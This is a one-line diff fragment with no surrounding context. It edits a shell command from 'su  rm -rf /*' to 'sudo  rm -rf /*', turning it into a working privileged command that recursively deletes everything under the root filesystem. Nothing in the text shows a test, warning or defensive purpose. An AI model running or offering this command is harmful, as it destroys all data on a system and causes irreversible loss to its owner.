@@ -1,1 +1,1 @@
-su  rm -rf /*
+sudo  rm -rf /*
